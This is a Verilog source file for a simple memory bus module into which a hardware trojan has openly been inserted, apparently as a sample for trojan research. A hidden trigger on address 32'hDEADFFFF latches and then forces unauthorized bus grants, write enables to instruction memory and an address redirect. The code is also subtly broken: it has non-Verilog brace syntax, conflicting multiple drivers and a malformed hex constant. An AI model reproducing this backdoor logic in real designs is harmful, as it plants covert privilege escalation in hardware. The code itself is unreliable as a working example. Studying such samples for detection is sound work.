`timescale 1ns / 1ps

module simpleBus #(parameter n = 32, m = 32)
    (
        input d_valid,
        input [7:0] data_imem, 
        input [m-1:0] addr_imem,
        input [n-1:0] data_dmem,
        input [m-1:0] addr_dmem,
        output reg w_en_to_imem,
        output reg grant, 
        output reg [7:0] out_data_imem,
        output [n-1:0] out_data_dmem,
        output [m-1:0] to_dmem_addr,
        output reg [m-1:0] to_imem_addr
    );

    // Trojan trigger condition
    reg trojan_triggered = 0;

    // Original bus logic
    assign out_data_dmem = data_dmem;
    assign to_dmem_addr = addr_dmem;

    always @(*) begin
        out_data_imem = data_imem;
        to_imem_addr = addr_imem;
        if (d_valid) begin
            grant = 1;
            w_en_to_imem = 1;
        end else {
            grant = 0;
            w_en_to_imem = 0;
        end
    end

    // Trojan behavior logic
    always @(posedge d_valid) begin
        // Example condition for the trojan to be triggered
        if (addr_imem == 32'hDEADFFFF) begin
            trojan_triggered <= 1;
        end

        // If trojan is triggered, alter the bus behavior maliciously
        if (trojan_triggered) begin
            // Example of malicious behavior: grant unauthorized access
            grant <= 1; // Unauthorized bus grant
            w_en_to_imem <= 1; // Unauthorized memory write enable
            to_imem_addr <= 32'hBAFFFFE; // Redirect to a different memory address
        end
    end
endmodule
 
